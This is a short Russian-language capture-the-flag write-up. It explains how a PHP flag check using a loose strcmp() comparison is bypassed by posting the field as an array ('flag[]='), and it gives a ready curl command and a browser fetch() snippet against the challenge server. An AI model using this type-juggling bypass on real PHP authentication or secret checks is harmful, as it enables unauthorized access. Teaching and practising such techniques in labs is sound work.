**Задание:**

Представление окончено! Теперь вам самим предстоит научиться еще одному трюку настоящего жонглера.

Адрес: http://31.207.77.216:4010

---
**Решение:**

Ключевая уязвимость находится в коде проверки флага:

```php
<?php
    if (isset($_POST['flag'])) {
        $flag = 'DUCKERZ{...}';
        if (strcmp($_POST['flag'], $flag) == 0) {
            echo "<div class='flag-success'>✅ Верно! Флаг: " . htmlspecialchars($flag) . "</div>";
        } else {
            echo "<div class='flag-fail'>❌ Неверный флаг.</div>";
        }
    }
?>
```

Уязвимость: функция `strcmp()` в PHP имеет особенность – если передать массив вместо строки, она вернет `NULL`, а при сравнении `NULL == 0` будет `true`.

Получение флага через curl:

```bash
curl -X POST http://31.207.77.216:4010/ --data "flag[]="
```

Получение флага через браузер (вкладка console):

```javascript
fetch('http://31.207.77.216:4010/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'flag[]='
})
.then(response => response.text())
.then(data => console.log(data));
```
